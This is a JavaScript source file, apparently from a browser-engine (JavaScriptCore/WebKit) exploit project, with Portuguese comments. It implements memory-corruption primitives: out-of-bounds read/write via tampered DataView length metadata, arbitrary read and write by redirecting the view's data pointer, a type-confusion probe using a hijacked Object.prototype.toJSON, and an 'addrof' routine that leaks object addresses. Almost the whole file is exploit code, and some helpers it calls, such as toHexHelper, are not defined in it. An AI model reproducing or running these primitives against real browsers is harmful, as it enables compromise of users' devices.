// js/core_exploit.mjs (ATUALIZADO - v23: Reutiliza DV + Sync, Funções arb_ síncronas)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) { /* ... como antes ... */
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
}
export function getOOBAllocationSize() { /* ... como antes ... */
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document);
    return OOB_CONFIG.ALLOCATION_SIZE;
}
export async function triggerOOB_primitive(options = { force_reinit: false }) { /* ... como antes, expande m_length ... */
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    if (isOOBEnvironmentSetup && !options.force_reinit) {
        let currentLength = 0;
        try { if(oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true); } catch(e){}
        if (oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real && currentLength === 0xFFFFFFFF) return true;
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    }
    const currentAllocSize = getOOBAllocationSize(); clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET + 3) {
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, true);
            log(`    m_length expandido.`, 'info', FNAME_TRIGGER);
        } else { throw new Error("Falha ao expandir m_length."); }
        isOOBEnvironmentSetup = true; log(`Ambiente OOB CONFIGURADO.`, 'good', FNAME_TRIGGER); return true;
    } catch (e) { log(`ERRO triggerOOB: ${e.message}`, 'critical', FNAME_TRIGGER); clearOOBEnvironment({ force_clear_even_if_not_setup: true }); throw e; }
}
export function oob_read_absolute(offset, byteLength) { /* ... como antes ... */ 
    if (!isOOBReady()) throw new Error("OOB não pronto para oob_read_absolute.");
    if (offset < 0 || (offset + byteLength) > oob_array_buffer_real.byteLength) throw new RangeError("oob_read_absolute fora dos limites.");
    switch (byteLength) {
        case 1: return oob_dataview_real.getUint8(offset);
        case 2: return oob_dataview_real.getUint16(offset, true);
        case 4: return oob_dataview_real.getUint32(offset, true);
        case 8: return new AdvancedInt64(oob_dataview_real.getUint32(offset, true), oob_dataview_real.getUint32(offset + 4, true));
        default: throw new Error("Invalid byteLength");
    }
}
export function oob_write_absolute(offset, value, byteLength) { /* ... como antes ... */
    if (!isOOBReady()) throw new Error("OOB não pronto para oob_write_absolute.");
    if (offset < 0 || (offset + byteLength) > oob_array_buffer_real.byteLength) throw new RangeError("oob_write_absolute fora dos limites.");
    let val64;
    switch (byteLength) {
        case 1: oob_dataview_real.setUint8(offset, Number(value)); break;
        case 2: oob_dataview_real.setUint16(offset, Number(value), true); break;
        case 4: oob_dataview_real.setUint32(offset, Number(value), true); break;
        case 8:
            val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
            oob_dataview_real.setUint32(offset, val64.low(), true);
            oob_dataview_real.setUint32(offset + 4, val64.high(), true);
            break;
        default: throw new Error("Invalid byteLength");
    }
}
export function isOOBReady() { /* ... como antes ... */ 
    let mLE = false; try { if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET + 3) mLE = (oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET, true) === 0xFFFFFFFF); } catch (e) {}
    return isOOBEnvironmentSetup && oob_array_buffer_real && oob_dataview_real && oob_dataview_real.buffer === oob_array_buffer_real && mLE;
}

function syncOOBDataView() { // Reintroduzida
    try { if (isOOBReady()) { oob_dataview_real.getUint8(0); oob_dataview_real.setUint8(0, oob_dataview_real.getUint8(0)); }
    } catch (e) { log(`ERRO syncOOBDataView: ${e.message}`, 'warn', 'CoreExploit.sync'); }
}

export function arb_read(absolute_address, byteLength) { // Síncrona
    const FNAME = 'CoreExploit.arb_read (v23)';
    if (!isOOBReady()) { throw new Error("OOB não pronto para arb_read."); }
    let addr64 = isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
    let mVO, mLO, mMO;
    try {
        mVO = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8); mLO = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4); mMO = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
        syncOOBDataView(); // Sincroniza após reconfigurar
        let res;
        switch (byteLength) {
            case 1: res = oob_dataview_real.getUint8(0); break;
            case 2: res = oob_dataview_real.getUint16(0, true); break;
            case 4: res = oob_dataview_real.getUint32(0, true); break;
            case 8: res = new AdvancedInt64(oob_dataview_real.getUint32(0, true), oob_dataview_real.getUint32(4, true)); break;
            default: throw new Error("Invalid byteLength");
        }
        return res;
    } catch (e) { log(`ERRO ${FNAME} lendo de ${addr64.toString(true)}: ${e.message}`, "critical"); throw e;
    } finally {
        if (mVO && typeof mLO === 'number' && typeof mMO === 'number' && isOOBReady()) {
            try { oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, mVO, 8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, mLO, 4); oob_write_absolute(OOB_DV_M_MODE_OFFSET, mMO, 4); syncOOBDataView(); }
            catch (eR) { log(`ERRO ${FNAME} restaurando metadados: ${eR.message}`, 'critical'); isOOBEnvironmentSetup = false; }
        } else if (isOOBReady()) { log(` ${FNAME} não pôde restaurar metadados.`, 'critical'); isOOBEnvironmentSetup = false; }
    }
}
export function arb_write(absolute_address, value, byteLength) { // Síncrona
    const FNAME = 'CoreExploit.arb_write (v23)';
    if (!isOOBReady()) { throw new Error("OOB não pronto para arb_write."); }
    let addr64 = isAdvancedInt64Object(absolute_address) ? absolute_address : new AdvancedInt64(absolute_address);
    let mVO, mLO, mMO;
    try {
        mVO = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8); mLO = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4); mMO = oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4);
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
        syncOOBDataView(); // Sincroniza após reconfigurar
        let val64;
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
            case 8:
                val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                oob_dataview_real.setUint32(0, val64.low(), true); oob_dataview_real.setUint32(4, val64.high(), true); break;
            default: throw new Error("Invalid byteLength");
        }
    } catch (e) { log(`ERRO ${FNAME} escrevendo em ${addr64.toString(true)}: ${e.message}`, "critical"); throw e;
    } finally {
        if (mVO && typeof mLO === 'number' && typeof mMO === 'number' && isOOBReady()) {
            try { oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, mVO, 8); oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, mLO, 4); oob_write_absolute(OOB_DV_M_MODE_OFFSET, mMO, 4); syncOOBDataView(); }
            catch (eR) { log(`ERRO ${FNAME} restaurando metadados: ${eR.message}`, 'critical'); isOOBEnvironmentSetup = false; }
        } else if (isOOBReady()) { log(` ${FNAME} não pôde restaurar metadados.`, 'critical'); isOOBEnvironmentSetup = false; }
    }
}

// ... (selfTestOOBReadWrite, selfTestTypeConfusionAndMemoryControl, attemptAddrofUsingCoreHeisenbug mantidos como antes)
export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log; const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite'; currentLog(`--- Iniciando Auto-Teste de OOB R/W ---`, 'test', FNAME_TEST);
    try { await triggerOOB_primitive({ force_reinit: true }); const tOff = 0x50, tV32=0x11223344; oob_write_absolute(tOff,tV32,4); const rV32=oob_read_absolute(tOff,4);
        if (rV32===tV32) currentLog(`SUCESSO R/W 32b: ${toHexHelper(rV32)}`, "good", FNAME_TEST); else {currentLog(`FALHA R/W 32b: Lido ${toHexHelper(rV32)}, Esperado ${toHexHelper(tV32)}`, "error", FNAME_TEST); throw new Error("Self-test 32bit failed");}
        const nOff=tOff+8; const tV64=new AdvancedInt64(0xAABBCCDD,0xEEFF0011); oob_write_absolute(nOff,tV64,8); const rV64=oob_read_absolute(nOff,8);
        if (isAdvancedInt64Object(rV64) && rV64.equals(tV64)) currentLog(`SUCESSO R/W 64b: ${rV64.toString(true)}`, "good", FNAME_TEST); else {currentLog(`FALHA R/W 64b: Lido ${isAdvancedInt64Object(rV64)?rV64.toString(true):String(rV64)}, Esperado ${tV64.toString(true)}`, "error", FNAME_TEST); throw new Error("Self-test 64bit failed");}
        currentLog(`--- Auto-Teste de OOB R/W Concluído ---`, 'test', FNAME_TEST); return true;
    } catch (e) { currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST); return false; }
}
const HEISENBUG_OOB_DATAVIEW_METADATA_BASE = OOB_DV_METADATA_BASE_IN_OOB_BUFFER;
const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const HEISENBUG_CRITICAL_WRITE_OFFSET = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET;
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF; const HEISENBUG_VICTIM_AB_SIZE = 64;
export async function selfTestTypeConfusionAndMemoryControl(logFnParam) {
    const cL = logFnParam || log; const F = 'CoreExploit.selfTestTypeConfusionAndMemoryControl'; cL(`--- Auto-Teste Combinado: TC & MemCtrl ---`, 'test', F);
    let otd=null, pa=false, lpd=null, os=true;
    try { cL(`FASE 1: TC (Heisenbug)...`, 'subtest', F); await triggerOOB_primitive({force_reinit:true}); if(!isOOBReady()) throw new Error("OOB init falhou TC.");
        cL(` (TC) Alvo: ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET)}`, 'info', F); oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE,4); await PAUSE(100);
        let vab = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE); cL(` (TC) victim_ab (tam ${HEISENBUG_VICTIM_AB_SIZE}) criado.`, "info", F);
        const tJP = function(){lpd={t:Object.prototype.toString.call(this),v:(this===vab)};return{p:true};};
        const pk='toJSON'; otd=Object.getOwnPropertyDescriptor(Object.prototype,pk); Object.defineProperty(Object.prototype,pk,{value:tJP,writable:true,configurable:true,enumerable:false}); pa=true;
        JSON.stringify(vab); cL(` (TC) Sonda: ${lpd?JSON.stringify(lpd):'N/A'}`, "leak", F);
        if(lpd&&lpd.v&&lpd.t==="[object Object]")cL(` (TC) SUCESSO: TC detectada!`, "vuln",F); else {cL(` (TC) FALHA: TC. Det: ${lpd?`v=${lpd.v}, t=${lpd.t}`:'N/A'}. Esperado [oO]&v=T.`, "error",F); os=false;}
    } catch(e){cL(`ERRO F1 (TC): ${e.message}`,'critical',F); os=false;}
    finally{if(pa){if(otd)Object.defineProperty(Object.prototype,'toJSON',otd);else delete Object.prototype['toJSON'];}}
    if(os){ await PAUSE(200); cL(`FASE 2: MemCtrl (m_len, m_mod)...`, 'subtest', F);
        try{ if(!isOOBReady()){await triggerOOB_primitive({force_reinit:true});if(!isOOBReady())throw new Error("OOB init falhou MC.");}
            const PL=0x12345678, PM=0x3; cL(` (MC) Escrevendo m_len/m_mod...`, 'info', F);
            oob_write_absolute(OOB_DV_M_LENGTH_OFFSET,PL,4); oob_write_absolute(OOB_DV_M_MODE_OFFSET,PM,4);
            const rL=oob_read_absolute(OOB_DV_M_LENGTH_OFFSET,4),rM=oob_read_absolute(OOB_DV_M_MODE_OFFSET,4);
            cL(` (MC) Lido m_len:${toHexHelper(rL)}, m_mod:${toHexHelper(rM)}`, "leak",F); let mcs=true;
            if(rL!==PL){cL(` (MC) FALHA: m_len.`, "error",F); mcs=false;} if(rM!==PM){cL(` (MC) FALHA: m_mod.`, "error",F); mcs=false;}
            if(mcs)cL(` (MC) SUCESSO: Ctrl m_len/m_mod!`, "vuln",F); else {cL(` (MC) FALHA: Ctrl m_len/m_mod.`, "error",F); os=false;}
        } catch(e){cL(`ERRO F2 (MC): ${e.message}`,'critical',F); os=false;}
    } else cL(`F1 (TC) falhou, pulando F2.`, 'warn', F);
    cL(`--- Auto-Teste Combinado ${os?'SUCESSO':'FALHA'} ---`, 'test', F); return os;
}
let _tOAP = null, _hCBP = false; function _tJPCI(){let cTT=Object.prototype.toString.call(this);if(cTT==='[object Object]'){_hCBP=true;if(_tOAP)this[0]=_tOAP;}else _hCBP=false;return{c:true,t:cTT};}
export async function attemptAddrofUsingCoreHeisenbug(tO){ /* ... mantido como antes, mas mais curto e com aviso ... */
    const F="CoreExploit.attemptAddrofUsingCoreHeisenbug"; log(`[${F}] AVISO: Addrof (Heisenbug) provalmente falhará.`,"warn",F); _tOAP=tO; _hCBP=false; let r={s:false,m:"Addrof(H) não inic."}; let otd=Object.getOwnPropertyDescriptor(Object.prototype,'toJSON'),p=false;
    try{await triggerOOB_primitive({force_reinit:true});if(!isOOBReady())throw new Error("OOB init falhou addrof."); oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET,HEISENBUG_CRITICAL_WRITE_VALUE,4); await PAUSE(100);
        let cab=new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE); let fv=new Float64Array(cab); fv.fill(0.4455667788); Object.defineProperty(Object.prototype,'toJSON',{value:_tJPCI,writable:true,configurable:true,enumerable:false}); p=true; JSON.stringify(cab);
        if(_hCBP){const vd=fv[0];const db=new ArrayBuffer(8);(new Float64Array(db))[0]=vd;const ia=new Uint32Array(db);r.leaked_address_as_int64=new AdvancedInt64(ia[0],ia[1]); if(vd!==0&&vd!==0.4455667788){r.s=true;r.m="Addrof(H) OK";}else r.m="Addrof(H) val suspeito.";}else r.m="Addrof(H) sonda falhou.";
    }catch(e){r.m=`Erro Addrof(H): ${e.message}`;}finally{if(p){if(otd)Object.defineProperty(Object.prototype,'toJSON',otd);else delete Object.prototype.toJSON;}_tOAP=null;} return r;
}
